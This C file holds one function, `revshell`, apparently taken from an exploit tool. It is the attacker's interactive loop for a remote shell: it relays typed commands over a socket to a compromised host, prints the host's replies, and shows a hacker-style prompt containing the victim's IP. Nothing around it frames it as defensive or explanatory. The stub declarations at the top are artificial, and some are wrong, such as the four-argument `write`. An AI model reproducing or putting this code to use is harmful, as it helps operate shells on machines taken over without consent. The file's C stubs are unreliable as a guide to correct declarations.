
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int F_GETFL ;
 int F_SETFL ;
 int O_NONBLOCK ;
 int assert (int) ;
 int fcntl (int,int ,int) ;
 int fflush (int ) ;
 char getchar () ;
 scalar_t__ malloc (int) ;
 int memset (char*,int ,int) ;
 int printf (char*,...) ;
 scalar_t__ recv (int,char*,int,int ) ;
 int send (int,char*,int ,int ) ;
 int stdout ;
 int strlen (char*) ;
 int write (int,char*,int ,int ) ;

void revshell(int sock, char *ip) {
 char *buf;
 int flags, i;
 long l;

 buf = (char *)malloc(1024);

 for (i = 0; i <= sock; i++) {
  flags = fcntl(i,F_GETFL,0);
  assert(flags != -1);
  fcntl(i, F_SETFL, flags | O_NONBLOCK);
 }

 while (1) {
  memset(buf, 0, 1024);
  if ((buf[0] = getchar()) > 0) {
   if ((send(sock, buf, strlen(buf), 0)) < 1) {
    break;
   }
  }

  memset(buf, 0, 1024);
  if (recv(sock, buf, 1024, 0) > 0) {
   write(1, buf, strlen(buf), 0);
   fflush(stdout);
   i = 1;
  } else if (i) {
   i = 0;
   printf("\nnoIPwn3r@%s$ ", ip);
   fflush(stdout);
  }
 }
 printf ("\n-= ADIOS =-\n");
 return;
}
